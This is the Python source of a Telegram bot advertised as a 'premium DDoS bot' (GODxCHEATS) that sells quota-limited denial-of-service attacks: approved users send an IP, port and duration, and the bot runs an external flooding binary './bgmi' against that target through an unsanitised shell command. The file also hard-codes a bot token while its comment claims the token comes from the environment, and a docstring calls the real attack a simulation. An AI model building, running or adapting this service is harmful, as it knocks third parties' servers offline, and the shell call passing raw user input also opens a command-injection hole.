import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os

# Configuration
TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Fetch token from environment variable
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
attack_in_progress = False

# Attack usage limits
MAX_ATTACK_TIME = 300  # Maximum time limit for attack
USER_ATTACKS = {}  # Dictionary to store user attack usage and cooldowns
DAILY_ATTACK_LIMIT = 5  # Maximum attacks per day

# Load and Save Functions for Approved IDs
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

approved_ids = load_approved_ids()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user."""
    chat_id = update.effective_chat.id
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands.\n\n"
        " [https://t.me/jwhu7hwbsnn/122]"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/details - Show user details and attack usage.\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
        "/set <limit> - Set daily attack limit (admin only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group ID to use the bot."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    # Extract the target ID
    target_id = args[0].strip()

    # Validate that the target ID is a number
    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    # Add the target ID to the approved list
    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def details(update: Update, context: CallbackContext):
    """Show user details including attack usage information."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user_attack_info = USER_ATTACKS.get(str(user_id), {"attacks_left": DAILY_ATTACK_LIMIT, "last_attack_time": 0, "last_attack_duration": 0})
    
    message = (
        f"*Details for @{update.effective_user.username}:*\n\n"
        f"*Remaining Attacks Today:* {user_attack_info['attacks_left']}\n"
        f"*Last Attack Time:* {user_attack_info['last_attack_time']}\n"
        f"*Last Attack Duration:* {user_attack_info['last_attack_duration']} seconds"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_limit(update: Update, context: CallbackContext):
    """Set daily attack limit for all users (admin only)."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /set <limit>*", parse_mode='Markdown')
        return

    global DAILY_ATTACK_LIMIT
    DAILY_ATTACK_LIMIT = int(args[0])
    
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Daily attack limit set to {DAILY_ATTACK_LIMIT} attacks.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and a channel member."""
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    user_attack_info = USER_ATTACKS.get(str(user_id), {"attacks_left": DAILY_ATTACK_LIMIT, "last_attack_time": 0, "last_attack_duration": 0})

    if user_attack_info['attacks_left'] <= 0:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have no attacks left today.*", parse_mode='Markdown')
        return

    current_time = time.time()
    if current_time - user_attack_info['last_attack_time'] < user_attack_info['last_attack_duration']:
        remaining_cooldown = user_attack_info['last_attack_duration'] - (current_time - user_attack_info['last_attack_time'])
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You need to wait {int(remaining_cooldown)} seconds before you can attack again.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time_duration = args

    try:
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_TIME:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Attack time cannot exceed {MAX_ATTACK_TIME} seconds.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid attack time format. Please provide a valid number.*", parse_mode='Markdown')
        return

    user_attack_info['attacks_left'] -= 1
    user_attack_info['last_attack_time'] = current_time
    user_attack_info['last_attack_duration'] = time_duration
    USER_ATTACKS[str(user_id)] = user_attack_info

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*✅ ATTACK INITIATED BY @{update.effective_user.username} ✅*\n\n"
            f"*🎯 Target IP:* {ip}\n"
            f"*🔌 Port:* {port}\n"
            f"*⏱ Duration:* {time_duration} seconds\n"
            "Image: [Click Here](https://t.me/jwhu7hwbsnn/122)"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, time_duration, context, update))

async def run_attack(chat_id, ip, port, time, context, update):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*♥️ ATTACK FINISHED BY @{update.effective_user.username} ♥️*\n*FEEDBACK SEND KAR LAUDE*",
            parse_mode='Markdown'
        )

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("details", details))
    application.add_handler(CommandHandler("set", set_limit))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
